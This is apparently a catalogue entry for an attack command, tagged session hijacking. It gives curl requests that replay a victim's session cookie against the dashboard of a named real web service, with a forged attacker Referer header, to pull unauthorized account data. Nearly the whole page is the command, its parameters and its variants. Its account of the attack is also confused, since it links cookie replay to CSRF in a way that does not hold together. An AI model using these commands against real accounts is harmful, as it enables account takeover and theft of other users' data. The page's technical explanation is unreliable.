---
id: c2b3c4d5-e6f7-8901-bcde-f23456789012
data: >-
  curl -X GET "https://app.krisp.ai/dashboard" -H "Cookie:
  session=victim_session_cookie" -H "Referer: https://attacker-site.com"
tags:
  - http-request
  - session-hijacking
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:31:42.563Z'
verified: false
validated: true
submitted: true
---
# curl-dashboard-access

## Command

```bash
curl -X GET "https://app.krisp.ai/dashboard" -H "Cookie: session=victim_session_cookie" -H "Referer: https://attacker-site.com"
```

## Description

Uses curl to send an HTTP GET request to the Krisp dashboard endpoint, impersonating the victim's session to retrieve unauthorized account data post-CSRF exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| URL | Target endpoint | Yes |
| `-H "Cookie: ..."` | Sets session cookie | Yes |
| `-H "Referer: ..."` | Fakes the referer header | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://app.krisp.ai/dashboard" -H "Cookie: session=abc123"
```

### Advanced Usage

```bash
curl -X GET "https://app.krisp.ai/dashboard" -H "Cookie: session=abc123" -H "User-Agent: Mozilla/5.0" -v
```

## Expected Output

<html><body>Account Dashboard: User settings and data...</body></html> or JSON response with account info.

## Related

- [[Related Procedure]]
